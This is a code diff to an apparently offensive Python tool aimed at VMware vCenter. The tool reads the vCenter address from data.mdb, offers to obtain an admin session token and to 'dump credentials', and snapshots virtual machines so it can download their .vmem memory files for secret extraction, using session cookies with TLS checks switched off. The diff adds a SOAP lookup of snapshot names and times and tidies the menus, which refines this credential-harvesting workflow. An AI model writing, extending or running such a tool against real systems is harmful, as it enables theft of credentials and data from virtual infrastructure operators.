@@ -984,6 +984,63 @@ def soap_list_vms(target: str, vim_cookie: str, verbose=False) -> list:
         return []
 
 
+# ─── SOAP snapshot info ─────────────────────────────────────────────────────────
+
+def soap_snapshot_info(target: str, vim_cookie: str, vm_moref: str) -> dict:
+    """Return {snap_id → {name, create_time}} via SOAP PropertyCollector."""
+    import requests as req
+    req.packages.urllib3.disable_warnings()
+    etree = _need('lxml.etree', 'lxml')
+    body = (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">'
+        '<SOAP-ENV:Body>'
+        '<RetrievePropertiesEx xmlns="urn:vim25">'
+        '<_this type="PropertyCollector">propertyCollector</_this>'
+        '<specSet>'
+        '<propSet><type>VirtualMachine</type>'
+        '<pathSet>snapshot.rootSnapshotList</pathSet></propSet>'
+        f'<objectSet><obj type="VirtualMachine">{vm_moref}</obj><skip>false</skip></objectSet>'
+        '</specSet>'
+        '<options/>'
+        '</RetrievePropertiesEx>'
+        '</SOAP-ENV:Body>'
+        '</SOAP-ENV:Envelope>'
+    )
+    try:
+        r = req.post(f'https://{target}/sdk', data=body.encode(),
+                     headers={'Content-Type': 'text/xml; charset=UTF-8',
+                              'SOAPAction': 'urn:vim25/8.0.3.0',
+                              'Cookie': f'vmware_soap_session={vim_cookie}'},
+                     verify=False, timeout=15)
+        if r.status_code != 200:
+            return {}
+        root = etree.fromstring(r.content)
+        ns = {'v': 'urn:vim25'}
+        out = {}
+
+        def _walk(el):
+            snap_id = el.findtext('v:id', namespaces=ns)
+            name    = el.findtext('v:name', namespaces=ns)
+            ct_str  = el.findtext('v:createTime', namespaces=ns)
+            if snap_id and name:
+                ct = None
+                if ct_str:
+                    try:
+                        ct = datetime.strptime(ct_str[:19], '%Y-%m-%dT%H:%M:%S').replace(tzinfo=timezone.utc)
+                    except ValueError:
+                        pass
+                out[int(snap_id)] = {'name': name, 'create_time': ct}
+            for child in el.findall('v:childSnapshotList', ns):
+                _walk(child)
+
+        for entry in root.findall('.//v:val', ns):
+            _walk(entry)
+        return out
+    except Exception:
+        return {}
+
+
 # ─── SOAP snapshot creation ─────────────────────────────────────────────────────
 
 _CREATE_SNAP_TMPL = '''\
@@ -1685,7 +1742,7 @@ def _select_vms(vms: list) -> list:
         mem   = v.get('memMB', '')
         print(f'  [{i}] {name}  ({state})  {mem} MB RAM')
     try:
-        raw = input('\n[?] Select VMs to dump (1, 2,3 or ALL): ').strip()
+        raw = input('[?] Select VMs to dump (1,2 or ALL): ').strip()
     except (EOFError, KeyboardInterrupt):
         return []
     if raw.upper() in ('A', 'ALL', ''):
@@ -1711,7 +1768,6 @@ def _select_snapshot_menu(entries: list, vm_name: str = '') -> tuple:
         dt = e['create_time'].strftime('%Y-%m-%d %H:%M UTC') if e['create_time'] else 'unknown'
         print(f'  [{i}] {e["name"]}  ({dt})')
     print(f'  [N] Create new snapshot')
-
     try:
         raw = input('[?] Select snapshot (1/N): ').strip()
     except (EOFError, KeyboardInterrupt):
@@ -1757,7 +1813,7 @@ def _parse_vmsd(text: str) -> list:
 
 
 def _discover_existing_snapshots(vc: 'VCenterSession', vm_name: str,
-                                  verbose: bool = False) -> list:
+                                  vm_id: str = '', verbose: bool = False) -> list:
     """
     Return existing snapshot entries [{stem, name, create_time}] sorted oldest→newest.
 
@@ -1811,20 +1867,25 @@ def _discover_existing_snapshots(vc: 'VCenterSession', vm_name: str,
               f'{sum(len(v) for v in by_num.values())} snapshot file(s) '
               f'across {len(by_num)} snapshot(s)')
 
-    # Try to enrich with .vmsd (names + dates) — best-effort only
+    # Enrich with snapshot names + creation times
+    # Primary: SOAP PropertyCollector (reliable across all vSphere versions)
+    # Fallback: vmsd parsing (used when no VIM session)
+    soap_info: dict = {}
+    if vc._vim_cookie and vm_id:
+        soap_info = soap_snapshot_info(vc.target, vc._vim_cookie, vm_id)
+
     vmsd_by_stem: dict = {}
-    vmsd_url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}'
-                f'/{urllib.parse.quote(vm_name)}.vmsd'
-                f'?dcPath={urllib.parse.quote(found_dc)}&dsName={urllib.parse.quote(found_ds)}')
-    try:
-        r = vc._s.get(vmsd_url, auth=vc._ds_auth, timeout=5)
-        if r.status_code == 200 and r.text.strip():
-            for e in _parse_vmsd(r.text):
-                vmsd_by_stem[e['stem']] = e
-            if verbose:
-                print(f'[v] .vmsd enrichment: {len(vmsd_by_stem)} entry/entries')
-    except Exception:
-        pass
+    if not soap_info:
+        vmsd_url = (f'https://{vc.target}/folder/{urllib.parse.quote(vm_name)}'
+                    f'/{urllib.parse.quote(vm_name)}.vmsd'
+                    f'?dcPath={urllib.parse.quote(found_dc)}&dsName={urllib.parse.quote(found_ds)}')
+        try:
+            r = vc._s.get(vmsd_url, auth=vc._ds_auth, timeout=5)
+            if r.status_code == 200 and r.text.strip():
+                for e in _parse_vmsd(r.text):
+                    vmsd_by_stem[e['stem']] = e
+        except Exception:
+            pass
 
     result = []
     for num in sorted(by_num.keys()):
@@ -1832,12 +1893,14 @@ def _discover_existing_snapshots(vc: 'VCenterSession', vm_name: str,
         vmsn  = next((f for f in files if f.lower().endswith('.vmsn')), None)
         stem  = (vmsn.rsplit('.', 1)[0] if vmsn
                  else next(iter(files)).rsplit('.', 1)[0])
-        meta  = vmsd_by_stem.get(stem, {})
-        result.append({
-            'stem':        stem,
-            'name':        meta.get('name', stem),
-            'create_time': meta.get('create_time'),
-        })
+        if soap_info and num in soap_info:
+            name = soap_info[num]['name']
+            ct   = soap_info[num]['create_time']
+        else:
+            meta = vmsd_by_stem.get(stem, {})
+            name = meta.get('name', stem)
+            ct   = meta.get('create_time')
+        result.append({'stem': stem, 'name': name, 'create_time': ct})
     return result
 
 
@@ -1979,8 +2042,8 @@ def main():
             sys.exit('[-] Could not extract vCenter address from data.mdb')
 
         print(f'\n[+] vCenter: {target}')
-        print('\n [1] Obtain admin session token')
-        print(' [2] Enumerate VMs and dump credentials')
+        print('[1] Obtain admin session token')
+        print('[2] Enumerate VMs and dump credentials')
         choice = input('[?] Select action (1/2): ').strip()
         if choice not in ('1', '2'):
             return
@@ -2039,7 +2102,7 @@ def main():
             vm_id   = vm.get('vm', '')
             vm_name = vm.get('name', vm_id)
 
-            vmsd_snaps = _discover_existing_snapshots(vc, vm_name, verbose=args.verbose)
+            vmsd_snaps = _discover_existing_snapshots(vc, vm_name, vm_id=vm_id, verbose=args.verbose)
             snap_choice, snap_entry = _select_snapshot_menu(vmsd_snaps, vm_name)
 
             target_files = None
@@ -2061,17 +2124,14 @@ def main():
                                            target_names=target_files)
 
             if not files:
-                print(f'    [-] No memory files found for {vm_name}')
+                print(f'[-] No memory files found for {vm_name}')
                 continue
 
             vmem = [f for f in files if f.suffix == '.vmem']
             if not vmem:
-                print(f'    [-] vmem not downloaded — snapshot preserved on datastore')
-                existing = sorted(output_dir.glob('*.vmem'), key=lambda p: p.stat().st_size, reverse=True)
-                if existing:
-                    print(f'    Free up space by removing old vmem files from {output_dir}:')
-                    for ev in existing:
-                        print(f'      {ev.name}  ({ev.stat().st_size >> 20} MB)')
+                print(f'[-] vmem not downloaded — free up disk space in {output_dir} and retry')
+                for ev in sorted(output_dir.glob('*.vmem'), key=lambda p: p.stat().st_size, reverse=True):
+                    print(f'    {ev.name}  ({ev.stat().st_size >> 20} MB)')
                 continue
 
             # Only remove snapshots once vmem is confirmed on disk
